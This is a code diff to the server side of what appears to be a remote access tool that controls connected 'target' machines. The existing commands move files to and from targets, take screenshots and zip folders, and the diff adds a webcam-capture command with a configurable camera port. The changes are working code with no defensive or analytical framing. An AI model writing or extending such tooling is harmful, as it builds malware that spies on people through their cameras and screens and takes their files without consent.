@@ -12,6 +12,7 @@ class Server:
     def __init__(self):
         self.cmd_timeout = 30
         self.zip_compression_level = 0
+        self.camera_port = 0
         self.connection = Connection()
 
         while True:
@@ -22,13 +23,13 @@ class Server:
 
                 if command == "h":
                     self.print_help()
-                elif command == "o" and len(attribute[0].split()) == 2 and attribute[0].split()[0].lower() in ["cmd_timeout", "zip_compression"]:
+                elif command == "o" and len(attribute[0].split()) == 2 and attribute[0].split()[0].lower() in ["cmd_timeout", "zip_compression", "camera_port"]:
                     self.set_option(attribute[0].split()[0].lower(), attribute[0].split()[1])
-                elif command == "l" and len(attribute) == 1:
+                elif command == "l" and len(attribute):
                     self.generate_texttable(self.get_conn_fgoi(attribute[0].split()))
                 elif command == "t" and len(attribute) == 2:
                     self.change_tag(attribute[0], self.get_conn_fgoi(attribute[1].split()))
-                elif command == "r" and len(attribute) == 1:
+                elif command == "r" and len(attribute):
                     self.remove_connection(self.get_conn_fgoi(attribute[0].split()))
                 elif command == "g" and len(attribute) == 2 and attribute[0].split()[0].lower() in ["add", "rm"]:
                     self.edit_group(attribute[0].split()[0].lower(), self.get_conn_fgoi(attribute[0].split()[0:]), attribute[1].split())
@@ -38,10 +39,12 @@ class Server:
                     self.download_file(attribute[0], attribute[1], self.get_conn_fgoi(attribute[2].split()))
                 elif command == "u" and len(attribute) == 3:
                     self.upload_file(attribute[0], attribute[1], self.get_conn_fgoi(attribute[2].split()))
-                elif command == "s" and len(attribute) == 3:
-                    self.make_screenshot(attribute[0].split()[0], attribute[0].split()[1], self.get_conn_fgoi(attribute[2].split()))
+                elif command == "s" and len(attribute) == 2 and len(attribute[0].split()) == 2:
+                    self.make_screenshot(attribute[0].split()[0], attribute[0].split()[1], self.get_conn_fgoi(attribute[1].split()))
                 elif command == "z" and len(attribute) == 3:
                     self.zip_file_or_folder(attribute[0], attribute[1], self.get_conn_fgoi(attribute[2].split()))
+                elif command == "w" and len(attribute) == 2:
+                    self.capture_camera_picture(attribute[0], self.get_conn_fgoi(attribute[1].split()))
                 elif command == "x":
                     self.connection.sock.close()
                     break
@@ -62,6 +65,7 @@ class Server:
         print("u [path to open] @ [path to save] @ [group(s) or index(s)] upload a file to target")
         print("s [monitor] [path_to_save] @ [group(s) or index(s)] capture screenshot")
         print("z [path_to_open] @ [path_to_save] @ [group(s) or index(s)]")
+        print("w [path_to_save] @ [group(s) or index(s)]")
         print("x exit server")
 
     def generate_texttable(self, connections):
@@ -88,6 +92,14 @@ class Server:
                     self.zip_compression_level = int(value)
             except ValueError:
                 print("[-] InvalidCompressionLevel")
+        elif option == "camera_port":
+            try:
+                if not int(value) < 0:
+                    print("[-] InvalidCameraPort")
+                else:
+                    self.camera_port = int(value)
+            except ValueError:
+                print("[-] InvalidCameraPort")
         else:
             print("[-] UnknownOption")
 
@@ -196,6 +208,17 @@ class Server:
         for connection in connections:
             try:
                 self.connection.send(("z" + str(self.zip_compression_level) + path_to_open + " @ " + path_to_save).encode(self.connection.CODEC), connection)
+                response = self.connection.recv(connection).decode(self.connection.CODEC)
+                if response.startswith("[-]"):
+                    print(response)
+            except socket.error as error:
+                print("[-] SocketError: " + str(error) + ": " + str(self.get_id_by_connection(connection)))
+
+    def capture_camera_picture(self, path_to_save, connections):
+        print("w" + str(self.camera_port) + " " + path_to_save)
+        for connection in connections:
+            try:
+                self.connection.send(("w" + str(self.camera_port) + " " + path_to_save).encode(self.connection.CODEC), connection)
                 response = self.connection.recv(connection).decode(self.connection.CODEC)
                 if response.startswith("[-]"):
                     print(response)
